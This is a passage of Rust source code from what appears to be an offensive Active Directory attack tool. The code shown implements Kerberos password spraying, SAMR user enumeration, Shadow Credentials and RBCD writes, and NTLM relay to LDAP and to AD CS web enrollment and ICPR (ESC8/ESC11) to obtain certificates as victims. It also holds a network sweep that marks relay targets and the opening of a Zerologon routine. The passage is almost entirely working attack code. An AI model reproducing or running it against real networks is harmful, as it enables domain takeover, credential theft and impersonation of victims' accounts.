            c.add_value(&target_dn, "member", &member_dn).await?;
            println!("[+] added {} to group {}", a.value, a.target);
        }
        "set-password" => {
            // AD refuses `unicodePwd` writes on an unencrypted channel — save the user a
            // WILL_NOT_PERFORM roundtrip by front-checking the URL and telling them why.
            let url = a.url.as_deref().unwrap_or("");
            if url.starts_with("ldap://") {
                anyhow::bail!(
                    "set-password requires an encrypted LDAP channel — use `ldaps://` \
                     (add --insecure for self-signed) or --gssapi with SASL sealing. \
                     Plain ldap:// will always fail with WILL_NOT_PERFORM (0x5003)."
                );
            }
            c.set_password(&target_dn, &a.value).await?;
            println!("[+] reset password of {}", a.target);
        }
        "add-keycred" => {
            // Shadow Credentials: add a KeyCredential to the target's msDS-KeyCredentialLink.
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&target_dn)?;
            c.add_value(&target_dn, "msDS-KeyCredentialLink", &kc.dn_binary).await?;
            let key_path = format!("{}.key.pem", a.target);
            std::fs::write(&key_path, &kc.private_key_pem)?;
            println!("[+] added Shadow Credential to {} — key saved to {key_path}", a.target);
            println!("    (Phase 2: PKINIT with this key to obtain a TGT as {})", a.target);
        }
        "write-rbcd" => {
            // value = SID (S-1-...) or sAMAccountName of the principal to grant delegation.
            let trustee = if a.value.starts_with("S-") {
                adhammer_core::sid::Sid::parse(&a.value).context("bad SID")?
            } else {
                c.resolve_sid(&a.value).await?
            };
            let sd = windows_sddl::build_rbcd_sd(&trustee);
            c.write_binary(&target_dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", sd).await?;
            println!("[+] wrote RBCD on {} allowing {} to impersonate to it", a.target, a.value);
        }
        other => anyhow::bail!("unknown action '{other}' (add-spn|add-member|set-password|write-rbcd|add-keycred|pkinit)"),
    }
    Ok(())
}

/// Kerberos password spray: one password across a user list, classified by KDC response.
async fn spray(a: SprayArgs) -> Result<()> {
    use adhammer_kerberos::{check_credential, CredResult};

    let users: Vec<String> = if let Some(path) = a.users.strip_prefix('@') {
        std::fs::read_to_string(path)
            .with_context(|| format!("read users list {path}"))?
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect()
    } else if std::path::Path::new(&a.users).is_file() {
        // Path passed without `@` prefix — a common gotcha. Treat as a file with a hint.
        eprintln!(
            "[!] `--users {}` looks like a file path — use `--users @{}` to read it as a list. Treating the arg as one user name.",
            a.users, a.users
        );
        vec![a.users.clone()]
    } else {
        a.users
            .split(',')
            .map(|u| u.trim().to_string())
            .filter(|u| !u.is_empty())
            .collect()
    };

    if users.is_empty() {
        anyhow::bail!("no users to spray (empty --users)");
    }
    eprintln!(
        "[*] spraying {} user(s) against {} @ {} …",
        users.len(),
        a.realm,
        a.kdc
    );
    let (mut valid, mut asrep, mut disabled, mut other) = (0u32, 0u32, 0u32, 0u32);
    for u in &users {
        match check_credential(u, &a.password, &a.realm, &a.kdc).await {
            Ok(CredResult::Valid) => {
                valid += 1;
                println!("[+] VALID           {u}:{}", a.password);
            }
            Ok(CredResult::ValidButExpired) => {
                valid += 1;
                println!("[+] VALID (expired) {u}:{}", a.password);
            }
            Ok(CredResult::Disabled) => {
                disabled += 1;
                println!("[-] disabled/locked {u}");
            }
            Ok(CredResult::NoPreAuth) => {
                asrep += 1;
                println!("[*] AS-REP roastable {u} (no pre-auth)");
            }
            Ok(CredResult::Invalid) | Ok(CredResult::NoSuchUser) => {} // quiet — the norm
            Ok(CredResult::Other(c)) => {
                other += 1;
                eprintln!("    {u}: KDC error {c}");
            }
            Err(e) => {
                other += 1;
                eprintln!("    {u}: {e}");
            }
        }
    }
    eprintln!(
        "[*] spray done: {}/{} valid, {} AS-REP roastable, {} disabled, {} other error(s)",
        valid,
        users.len(),
        asrep,
        disabled,
        other
    );
    Ok(())
}

/// LSAT name→SID over \lsarpc (SMB2 → NTLM → DCE/RPC → LsarOpenPolicy2 → LsarLookupNames).
async fn lsa(a: LsaArgs) -> Result<()> {
    use dcerpc::lsat::LsatClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("lsarpc").await?;

    let mut client = LsatClient::bind(&mut smb, pipe).await?;
    let policy = client.open_policy().await?;
    match client.lookup_name(&policy, &a.name).await? {
        Some(sid) => println!("{} => {sid}", a.name),
        None => println!("{} => (not mapped)", a.name),
    }
    Ok(())
}

/// Full path: SMB2 negotiate → NTLM session → IPC$ → \samr pipe →
/// DCE/RPC bind → SamrConnect → enumerate domain users.
async fn samr(a: SamrArgs) -> Result<()> {
    use dcerpc::samr::SamrClient;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb_login(
        &mut smb,
        &a.host,
        &a.domain,
        &a.user,
        &a.password,
        &a.nt_hash,
    )
    .await?;
    tracing::info!("SMB session established");
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let pipe = smb.open_pipe("samr").await?;
    tracing::info!("\\samr pipe open");

    let mut client = SamrClient::bind(&mut smb, pipe).await?;
    let users = client
        .enumerate_all_users(&format!("\\\\{}", a.host))
        .await?;
    println!("== SAMR users ({}) ==", users.len());
    for (rid, name) in users {
        println!("  {rid}\t{name}");
    }
    Ok(())
}

/// Common service ports scanned by the network sweep (FTP → RDP and the rest of the estate).
const SERVICES: &[(u16, &str)] = &[
    (21, "ftp"),
    (22, "ssh"),
    (23, "telnet"),
    (25, "smtp"),
    (53, "dns"),
    (80, "http"),
    (88, "kerberos"),
    (110, "pop3"),
    (111, "rpcbind"),
    (135, "msrpc"),
    (139, "netbios"),
    (143, "imap"),
    (389, "ldap"),
    (443, "https"),
    (445, "smb"),
    (464, "kpasswd"),
    (587, "smtp"),
    (636, "ldaps"),
    (873, "rsync"),
    (993, "imaps"),
    (995, "pop3s"),
    (1433, "mssql"),
    (1521, "oracle"),
    (2049, "nfs"),
    (3268, "gc"),
    (3306, "mysql"),
    (3389, "rdp"),
    (5432, "postgres"),
    (5900, "vnc"),
    (5985, "winrm"),
    (5986, "winrm-s"),
    (6379, "redis"),
    (8080, "http-alt"),
    (8443, "https-alt"),
    (9200, "elastic"),
];
/// Ports whose services send a text greeting on connect — grab it for version intel.
const GREETERS: &[u16] = &[21, 22, 25, 110, 143];

/// One of the write-actions the relay can perform once it has an LDAP session as the victim.
#[derive(Clone, Debug)]
enum RelayTarget {
    /// Write msDS-KeyCredentialLink on `target_object` (shadow credentials → PKINIT).
    LdapKeycred,
    /// Write msDS-AllowedToActOnBehalfOfOtherIdentity on `target_object` (RBCD → S4U2Proxy).
    LdapRbcd,
    /// ESC8 — relay to AD CS Web Enrollment: `(ca_host, ca_port, template, insecure)`.
    AdcsHttp(String, u16, String, bool),
    /// ESC11 — relay to MS-ICPR (`\PIPE\cert` alternative ncacn_ip_tcp endpoint): `(ca_host, template)`.
    Icpr(String, String),
}

/// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
/// then perform a chosen write on `target_object`. Chain with `attack coerce`/`poison`.
async fn relay(a: RelayArgs) -> Result<()> {
    use smb2_client::server::RelayConn;

    // Resolve --target early so the user gets a clear error before the listener is up.
    let (target, trustee_sid) = match a.target.as_str() {
        "ldap-keycred" => (RelayTarget::LdapKeycred, None),
        "ldap-rbcd" => {
            let sid = a.trustee_sid.clone().ok_or_else(|| {
                anyhow::anyhow!(
                    "--target ldap-rbcd requires --trustee-sid <SID of a controlled account>"
                )
            })?;
            (RelayTarget::LdapRbcd, Some(sid))
        }
        "adcs-http" => {
            let ca = a.ca_host.clone().ok_or_else(|| {
                anyhow::anyhow!("--target adcs-http requires --ca-host <ca.corp.local>")
            })?;
            (
                RelayTarget::AdcsHttp(ca, a.ca_port, a.ca_template.clone(), a.ca_insecure),
                None,
            )
        }
        "icpr" => {
            let ca = a.ca_host.clone().ok_or_else(|| {
                anyhow::anyhow!("--target icpr requires --ca-host <ca.corp.local>")
            })?;
            (RelayTarget::Icpr(ca, a.ca_template.clone()), None)
        }
        other => {
            anyhow::bail!("unknown --target {other} (ldap-keycred | ldap-rbcd | adcs-http | icpr)")
        }
    };

    let base: String = a
        .realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");
    let listener = RelayConn::listen(&a.listen).await?;
    println!(
        "[*] relay listening on {} → LDAP {} ({:?} on {})",
        a.listen, a.target_dc, target, a.target_object
    );
    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
    loop {
        let (stream, peer) = listener.accept().await?;
        let (target_dc, base, target_object, trustee, tgt) = (
            a.target_dc.clone(),
            base.clone(),
            a.target_object.clone(),
            trustee_sid.clone(),
            target.clone(),
        );
        tokio::spawn(async move {
            if let Err(e) = relay_one(
                stream,
                &peer.to_string(),
                &target_dc,
                &base,
                &target_object,
                tgt,
                trustee.as_deref(),
            )
            .await
            {
                println!("[-] relay from {peer} failed: {e}");
            }
        });
    }
}

#[allow(clippy::too_many_arguments)]
async fn relay_one(
    stream: tokio::net::TcpStream,
    peer: &str,
    target_dc: &str,
    base: &str,
    target_object: &str,
    target: RelayTarget,
    trustee_sid: Option<&str>,
) -> Result<()> {
    use smb2_client::server::RelayConn;
    let mut rc = RelayConn::new(stream);
    let type1 = rc.recv_type1().await?;

    // ESC8 relay: HTTP not LDAP, so branch off before opening the LDAP client.
    if let RelayTarget::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
        return relay_esc8(
            rc,
            type1,
            peer,
            target_object,
            ca_host,
            port,
            template,
            insecure,
        )
        .await;
    }
    // ESC11 relay: ncacn_ip_tcp to MS-ICPR — NTLM auth handshake, then unsealed CertServerRequest.
    if let RelayTarget::Icpr(ref ca_host, ref template) = target {
        return relay_icpr(rc, type1, peer, target_object, ca_host, template).await;
    }

    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
    let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
    let type2 = ld.sasl_step1(&type1).await?; // target's challenge
    rc.send_challenge(&type2).await?; // → victim signs the target's challenge
    let type3 = rc.recv_type3().await?;
    ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
    println!("[+] relayed bind to {target_dc} succeeded as the victim");
    let dn = ld.find_dn(base, target_object).await?;

    match target {
        RelayTarget::AdcsHttp(_, _, _, _) | RelayTarget::Icpr(_, _) => {
            unreachable!("handled above")
        }
        RelayTarget::LdapKeycred => {
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
            ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                .await?;
            std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
            println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
            println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
        }
        RelayTarget::LdapRbcd => {
            let trustee = trustee_sid.expect("checked in relay(): --trustee-sid required");
            let trustee = windows_sddl::sid::Sid::parse(trustee)
                .ok_or_else(|| anyhow::anyhow!("bad trustee SID: {trustee}"))?;
            let sd = windows_sddl::build_rbcd_sd(&trustee);
            ld.modify_add(&dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
                .await?;
            println!(
                "[+] RBCD written on {dn} — trustee {} can now S4U2Proxy → any user on {target_object}",
                trustee_sid.unwrap()
            );
            println!(
                "    → attack rbcd --host <trustee-host> --target-spn cifs/{target_object} --target-user Administrator"
            );
        }
    }
    Ok(())
}

/// ESC8 — relay a victim's SMB NTLM to AD CS Web Enrollment. Sends `Type1` in the
/// Authorization header on the CSR POST (empty body on the probe), takes the DC's `Type2`
/// out of the `WWW-Authenticate` header, sends it back to the victim, forwards the returned
/// `Type3` on the same TCP connection with the real CSR body — the CA issues a certificate
/// whose Kerberos identity is the relayed victim. Write cert + private key to disk so the
/// attacker can PKINIT with them.
#[allow(clippy::too_many_arguments)]
async fn relay_esc8(
    mut rc: smb2_client::server::RelayConn,
    type1: Vec<u8>,
    peer: &str,
    target_object: &str,
    ca_host: &str,
    ca_port: u16,
    template: &str,
    insecure: bool,
) -> Result<()> {
    use adcs_relay::{
        base64_decode, base64_encode, cert_request_form, parse_ntlm_challenge, parse_request_id,
        HttpsClient,
    };

    println!(
        "[+] victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
    );
    let mut http = HttpsClient::connect(ca_host, ca_port, insecure).await?;

    // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
    // authenticated Kerberos/NTLM channel — that's the victim we're relaying).
    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc8", None)?;
    let csr_pem = pem_wrap("CERTIFICATE REQUEST", &csr.der);
    let form = cert_request_form(&csr_pem, template);

    // Round 1: POST with Type-1 in Authorization; probe body kept minimal until the auth loop
    // completes on Type-3, when we send the real CSR form.
    let type1_b64 = base64_encode(&type1);
    let auth1 = format!("NTLM {type1_b64}");
    let headers1: &[(&str, &str)] = &[
        ("Authorization", &auth1),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("User-Agent", "adhammer-esc8/1"),
    ];
    let r1 = http
        .send("POST", "/certsrv/certfnsh.asp", headers1, b"")
        .await?;
    if r1.status != 401 {
        anyhow::bail!(
            "CA expected 401 with WWW-Authenticate NTLM Type-2, got {} (server may reject relayed auth)",
            r1.status
        );
    }
    let type2 = r1
        .header("WWW-Authenticate")
        .and_then(parse_ntlm_challenge)
        .context("no NTLM Type-2 in WWW-Authenticate")?;

    // Forward Type-2 to the victim and get Type-3 back.
    rc.send_challenge(&type2).await?;
    let type3 = rc.recv_type3().await?;

    // Round 2: POST with Type-3 in Authorization AND the CSR form body.
    let type3_b64 = base64_encode(&type3);
    let auth3 = format!("NTLM {type3_b64}");
    let headers3: &[(&str, &str)] = &[
        ("Authorization", &auth3),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("User-Agent", "adhammer-esc8/1"),
    ];
    let r2 = http
        .send("POST", "/certsrv/certfnsh.asp", headers3, form.as_bytes())
        .await?;
    if r2.status != 200 {
        anyhow::bail!(
            "CA rejected the CSR submission after NTLM auth: HTTP {} (template `{template}` may require different attrs, or the relayed identity lacks Enroll)",
            r2.status
        );
    }
    let html = String::from_utf8_lossy(&r2.body);
    let req_id = parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
    println!("[+] CA accepted submission — Request ID {req_id}, fetching certificate…");

    // Round 3: GET the issued cert. This may reuse the same connection or open a new one;
    // AD CS is happy with either — send unauthenticated (session already established), and if
    // the CA insists, replaying Type-3 here works because it was on the same stream.
    let path = format!("/certsrv/certnew.cer?ReqID={req_id}&Enc=b64");
    let r3 = http
        .send("GET", &path, &[("User-Agent", "adhammer-esc8/1")], b"")
        .await?;
    if r3.status != 200 {
        anyhow::bail!("certnew.cer returned HTTP {} for ReqID {req_id}", r3.status);
    }
    // The response is either PEM or a base64 blob depending on `Enc=b64`.
    let cert_bytes = if r3.body.starts_with(b"-----BEGIN") {
        r3.body.clone()
    } else {
        let s = String::from_utf8_lossy(&r3.body);
        base64_decode(s.trim())
            .map(|der| pem_wrap("CERTIFICATE", &der).into_bytes())
            .unwrap_or(r3.body.clone())
    };
    let cert_path = format!("{target_object}.esc8.pem");
    let key_path = format!("{target_object}.esc8.key.pem");
    std::fs::write(&cert_path, &cert_bytes)?;
    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
    println!("[+] certificate written to {cert_path} — key {key_path}");
    println!(
        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
    );
    Ok(())
}

/// ESC11 — relay a victim's SMB NTLM to MS-ICPR (`ICertPassage`) on the CA's ncacn_ip_tcp
/// endpoint. Same shape as ESC8: forward Type1 → get Type2 back → forward to victim → get
/// Type3 → complete auth. Then submit the CSR via `CertServerRequest` (opnum 0).
///
/// Uses auth-level `PKT_CONNECT`, not `PKT_PRIVACY` — the relaying attacker doesn't hold the
/// victim's NTLM session key, so per-message signing/sealing is impossible. Whether the CA's
/// ICPR endpoint accepts CONNECT-level auth is a per-server config; if it enforces PRIVACY
/// (spec says it SHOULD), the CertServerRequest will fault with a clear RPC error rather
/// than silently misbehave.
async fn relay_icpr(
    mut rc: smb2_client::server::RelayConn,
    type1: Vec<u8>,
    peer: &str,
    target_object: &str,
    ca_host: &str,
    template: &str,
) -> Result<()> {
    use dcerpc::{epm, icpr, transport::RpcTcp};

    println!("[+] victim {peer} started NTLM — relaying to MS-ICPR at {ca_host} (ESC11)");
    let port = epm::resolve_port(ca_host, icpr::icpr_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{ca_host}:{port}")).await?;

    // 3-leg NTLM handshake, opaquely forwarded.
    let type2 = rpc.bind_relay_start(icpr::icpr_syntax(), &type1).await?;
    rc.send_challenge(&type2).await?;
    let type3 = rc.recv_type3().await?;
    rpc.bind_relay_finish(&type3).await?;
    println!("[+] relayed CONNECT-level bind to ICPR succeeded as the victim");

    // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
    // authentication, so no subject encoding is needed on our side.
    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc11", None)?;
    // The CA name is a required arg to CertServerRequest; on most CAs the ICPR endpoint
    // will infer it from context, but a client that sends the CN of the certification
    // authority is safe. The `target_object` name is not it — take the machine short-name.
    let authority = ca_host.split('.').next().unwrap_or(ca_host);
    let stub = icpr::encode_cert_server_request(authority, template, &csr.der);
    let resp = rpc
        .call(icpr::CERT_SERVER_REQUEST_OPNUM, &stub)
        .await
        .map_err(|e| {
            anyhow::anyhow!(
                "CertServerRequest failed — the CA likely enforces PKT_PRIVACY on ICPR (matrix-validation-owed): {e}"
            )
        })?;
    let result = icpr::decode_cert_server_response(&resp)?;
    if result.disposition != 3 {
        anyhow::bail!(
            "CA disposition {}: {} (3 = ISSUED, 5 = UNDER SUBMISSION, else denied)",
            result.disposition,
            result.message
        );
    }
    let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
    let cert_path = format!("{target_object}.esc11.pem");
    let key_path = format!("{target_object}.esc11.key.pem");
    std::fs::write(&cert_path, cert_pem.as_bytes())?;
    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
    println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
    println!(
        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
    );
    Ok(())
}

/// Wrap raw DER as PEM with the given label.
fn pem_wrap(label: &str, der: &[u8]) -> String {
    use adcs_relay::base64_encode;
    let b64 = base64_encode(der);
    let mut out = format!("-----BEGIN {label}-----\n");
    for line in b64.as_bytes().chunks(64) {
        out.push_str(std::str::from_utf8(line).unwrap());
        out.push('\n');
    }
    out.push_str(&format!("-----END {label}-----\n"));
    out
}

/// Network sweep: full service scan + banner grab per target, DC detection, and SMB signing
/// (NTLM-relay) posture — the attack-surface map for the whole estate.
async fn netenum(a: NetArgs) -> Result<()> {
    let hosts = expand_targets(&a.targets)?;
    let sp = ui::Spinner::start(format!(
        "sweeping {} host(s) × {} ports",
        hosts.len(),
        SERVICES.len()
    ));

    let sem = std::sync::Arc::new(tokio::sync::Semaphore::new(a.concurrency));
    let mut set = tokio::task::JoinSet::new();
    for host in hosts {
        for &(port, svc) in SERVICES {
            let sem = sem.clone();
            let host = host.clone();
            set.spawn(async move {
                let _permit = sem.acquire().await.ok()?;
                let banner = probe_port(&host, port).await?; // None if closed
                Some((host, port, svc, banner))
            });
        }
    }
    // Group open ports by host. (port, service-name, optional banner)
    type PortEntry = (u16, &'static str, Option<String>);
    let mut hosts_map: std::collections::HashMap<String, Vec<PortEntry>> = Default::default();
    while let Some(r) = set.join_next().await {
        if let Ok(Some((host, port, svc, banner))) = r {
            hosts_map.entry(host).or_default().push((port, svc, banner));
        }
    }

    // SMB signing (relay) posture for hosts exposing 445.
    let mut signing: std::collections::HashMap<String, (u16, bool)> = Default::default();
    for (host, ports) in &hosts_map {
        if ports.iter().any(|(p, _, _)| *p == 445) {
            if let Ok(mut c) = smb2_client::SmbClient::connect(host).await {
                if let Ok(s) = c.probe_signing().await {
                    signing.insert(host.clone(), s);
                }
            }
        }
    }

    let mut hosts_sorted: Vec<_> = hosts_map.into_iter().collect();
    hosts_sorted.sort_by_key(|(h, _)| {
        h.parse::<std::net::Ipv4Addr>()
            .map(u32::from)
            .unwrap_or(u32::MAX)
    });

    if hosts_sorted.is_empty() {
        sp.done_warn("no live hosts found in range");
    } else {
        sp.done(&format!("{} live host(s)", hosts_sorted.len()));
    }
    ui::header(&format!(
        "network sweep — {} live host(s)",
        hosts_sorted.len()
    ));
    let mut relay = Vec::new();
    for (host, mut ports) in hosts_sorted {
        ports.sort_by_key(|(p, _, _)| *p);
        let has = |p: u16| ports.iter().any(|(x, _, _)| *x == p);
        let role = if has(88) && has(389) { "DC  " } else { "host" };
        println!("  {host:<15} {role}");
        for (port, svc, banner) in &ports {
            let b = banner
                .as_deref()
                .map(|s| format!("  {s}"))
                .unwrap_or_default();
            println!("      {port:<5} {svc:<10}{b}");
        }
        if let Some((d, req)) = signing.get(&host) {
            if *req {
                println!("      445   smb-signing REQUIRED (0x{d:04x})");
            } else {
                println!("      445   smb-signing OFF → NTLM-RELAY TARGET (0x{d:04x})");
                relay.push(host.clone());
            }
        }
        if a.deep {
            for (port, _, _) in &ports {
                if let Some(finding) = deep_check(&host, *port, a.zone.as_deref()).await {
                    println!("      [!]   {port:<5} {finding}");
                }
            }
            // SNMP is UDP/161 — not in the TCP sweep, so probe it per host under --deep.
            if let Some(finding) = snmp_public(&host, &a.community).await {
                println!("      [!]   161   {finding}");
            }
        }
    }
    if !relay.is_empty() {
        println!(
            "\n[+] {} NTLM-relay target(s) (SMB signing not required): {}",
            relay.len(),
            relay.join(", ")
        );
    }
    Ok(())
}

/// Connect to `host:port` (timeout). Returns Some(banner) if open — banner is the service
/// greeting for text protocols, empty otherwise; None if the port is closed/filtered.
async fn probe_port(host: &str, port: u16) -> Option<Option<String>> {
    use tokio::io::AsyncReadExt;
    use tokio::time::{timeout, Duration};
    let connect = smb2_client::socks::dial(host, port);
    let mut stream = match timeout(Duration::from_millis(800), connect).await {
        Ok(Ok(s)) => s,
        _ => return None, // closed / filtered
    };
    if !GREETERS.contains(&port) {
        return Some(None);
    }
    // Read the service greeting (FTP/SSH/SMTP/POP3/IMAP announce on connect).
    let mut buf = [0u8; 256];
    let banner = match timeout(Duration::from_millis(600), stream.read(&mut buf)).await {
        Ok(Ok(n)) if n > 0 => {
            let line = String::from_utf8_lossy(&buf[..n]);
            Some(line.lines().next().unwrap_or("").trim().to_string())
        }
        _ => None,
    };
    Some(banner)
}

/// Per-service unauthenticated attack checks (--deep).
async fn deep_check(host: &str, port: u16, zone: Option<&str>) -> Option<String> {
    match port {
        21 => ftp_anon(host).await,
        25 => smtp_vrfy(host).await,
        53 => dns_check(host, zone).await,
        111 => nfs_showmount(host).await, // portmap → mountd EXPORT; covers NFS behind it
        135 => rpc_surface(host).await,
        873 => rsync_modules(host).await,
        1433 => mssql_prelogin(host).await,
        3306 => mysql_probe(host).await,
        6379 => redis_unauth(host).await,
        5900 => vnc_noauth(host).await,
        5985 | 5986 => winrm_probe(host, port).await,
        _ => None,
    }
}

async fn connect(host: &str, port: u16) -> Option<tokio::net::TcpStream> {
    tokio::time::timeout(
        std::time::Duration::from_millis(1200),
        smb2_client::socks::dial(host, port),
    )
    .await
    .ok()?
    .ok()
}
async fn read_some(s: &mut tokio::net::TcpStream, buf: &mut [u8]) -> usize {
    use tokio::io::AsyncReadExt;
    tokio::time::timeout(std::time::Duration::from_millis(900), s.read(buf))
        .await
        .ok()
        .and_then(|r| r.ok())
        .unwrap_or(0)
}

/// Registry-only AD CS ESC checks (ESC6/10/11/16) over MS-RRP: authenticate over SMB, open
/// `\winreg`, read the CA/DC registry values, and decide each ESC. Needs the target's Remote
/// Registry service reachable.
async fn esc_registry_scan(a: EscArgs) -> Result<()> {
    use crate::esc_registry::{esc10, esc11, esc16, esc6, esc7};
    use dcerpc::rrp::RegistryClient;
    use smb2_client::SmbClient;

    let sp = ui::Spinner::start(format!("{} — SMB auth + \\winreg", a.host));
    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
    let mut reg = RegistryClient::connect(&mut smb, &a.domain, &a.user, &a.password, &a.host)
        .await
        .map_err(|e| {
            // 0xC00000AC = STATUS_ILLEGAL_FUNCTION → \winreg pipe not exposed, i.e. the
            // Remote Registry service is stopped/disabled. Very common on hardened DCs.
            let msg = e.to_string();
            if msg.contains("0xc00000ac") || msg.contains("open \\winreg") {
                anyhow::anyhow!(
                    "\\winreg unreachable on {} — the Remote Registry service is stopped or \
                     disabled (STATUS_ILLEGAL_FUNCTION 0xC00000AC). Start it on the CA host \
                     (`Set-Service RemoteRegistry -StartupType Automatic; Start-Service RemoteRegistry`) \
                     then rerun. ESC1/2/3/4/9/13 don't need this — only ESC6/10/11/16 read \
                     registry state.",
                    a.host
                )
            } else {
                e.into()
            }
        })?;
    sp.done("Remote Registry reachable");

    ui::header(&format!("AD CS registry ESC checks — CA {}", a.ca));
    let ca = format!(
        "SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{}",
        a.ca
    );
    let mut hits = Vec::new();

    // InterfaceFlags sits directly under the CA config key. If absent, the default lacks
    // IF_ENFORCEENCRYPTICERTREQUEST (relayable), so treat a missing value as 0 rather than skipping.
    let iflags = reg
        .read_value(&ca, "InterfaceFlags")
        .await
        .ok()
        .and_then(|v| v.as_dword())
        .unwrap_or(0);
    hits.extend(esc11(iflags));

    // EditFlags and DisableExtensionList live under the *active policy module* subkey, whose name
    // is the `Active` REG_SZ under `<CA>\PolicyModules` (e.g. CertificateAuthority_MicrosoftDefault.Policy).
    let pm_root = format!("{ca}\\PolicyModules");
    let policy = reg
        .read_value(&pm_root, "Active")
        .await
        .map(|v| v.as_string())
        .unwrap_or_else(|_| "CertificateAuthority_MicrosoftDefault.Policy".into());
    let policy_key = format!("{pm_root}\\{policy}");
    if let Ok(v) = reg.read_value(&policy_key, "EditFlags").await {
        if let Some(d) = v.as_dword() {
            hits.extend(esc6(d));
        }
    }
    if let Ok(v) = reg.read_value(&policy_key, "DisableExtensionList").await {
        hits.extend(esc16(&v.as_string()));
    }
    // ESC7 — the CA `Security` REG_BINARY is a SECURITY_DESCRIPTOR; flag non-Tier-0 ManageCA/Certs.
    if let Ok(v) = reg.read_value(&ca, "Security").await {
        hits.extend(esc7(&v.data));
    }
    // ESC10 lives on the DC's Kdc key and only applies to a DC. Confirm DC-ness via NTDS first so an
    // absent value on a CA-only host isn't mis-flagged; on a real DC, an absent value is NOT
    // automatically safe (weak default on 2016–2022), so flag it with that caveat.
    let is_dc = reg
        .read_value(
            "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
            "DSA Working Directory",
        )
        .await
        .is_ok()
        || reg
            .read_value(
                "SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters",
                "Machine DN Name",
            )
            .await
            .is_ok();
    if is_dc {
        match reg
            .read_value(
                "SYSTEM\\CurrentControlSet\\Services\\Kdc",
                "StrongCertificateBindingEnforcement",
            )
            .await
        {
            Ok(v) => match v.as_dword() {
                Some(d) => hits.extend(esc10(d)),
                None => hits.push(crate::esc_registry::esc10_absent()),
            },
            Err(_) => hits.push(crate::esc_registry::esc10_absent()),
        }
    }

    if hits.is_empty() {
        ui::ok("no registry-based ESC (ESC6/10/11/16) exposure found");
    } else {
        for h in &hits {
            ui::warn(&format!("{} — {}", h.id, h.title));
            ui::field("detail", &h.detail);
        }
        ui::warn(&format!(
            "{} registry-based ESC exposure(s) on {}",
            hits.len(),
            a.host
        ));
    }
    Ok(())
}

/// Zerologon (CVE-2020-1472) SAFE detection: try the all-zero Netlogon handshake over MS-NRPC and
/// report whether the DC accepts it. Never calls NetrServerPasswordSet2 — the machine password is
/// left untouched. Exploitation (with password restore) is a separate, explicitly-confirmed step.
async fn zerologon(a: ZerologonArgs) -> Result<()> {
    use dcerpc::netlogon::{
        detect_zerologon, exploit_set_empty_password, restore_password, restore_password_cleartext,
        Zerologon,
    };

    // Full restore path: set the machine account back to a known CLEARTEXT (heals NT + AES).
    if let Some(pw) = &a.restore_password {
        let sp = ui::Spinner::start(format!(
            "{} — full restore of {}$ (cleartext)",
            a.host, a.netbios
        ));
        let ok = restore_password_cleartext(&a.host, &a.netbios, pw, a.attempts).await?;
        if ok {
            sp.done("restore accepted");
            ui::ok(&format!(
                "machine account {}$ fully restored (NT + AES) — reboot the DC to heal the secure channel.",
                a.netbios
            ));
        } else {
            sp.done("restore not accepted");
            ui::warn("NetrServerPasswordSet2 rejected (DC not vulnerable, or machine password not empty).");
        }
        return Ok(());
    }

    // Restore path: set the machine account back to a known NT hash over the zero channel.
    if let Some(hex) = &a.restore {
        let nt = parse_nt_hash(hex)?;
        let sp = ui::Spinner::start(format!(
            "{} — restoring {}$ machine hash via Netlogon",
            a.host, a.netbios
        ));
        let ok = restore_password(&a.host, &a.netbios, &nt, a.attempts).await?;
        if ok {
            sp.done("restore accepted");
            ui::ok(&format!(
                "machine account {}$ set back to {hex} — reboot the DC so LSASS re-reads the (now-matching) secret.",
                a.netbios
            ));
        } else {
            sp.done("restore not accepted");
            ui::warn("NetrServerPasswordSet was rejected (DC no longer vulnerable, or machine password is not empty).");
        }
        return Ok(());
    }
    let sp = ui::Spinner::start(format!(
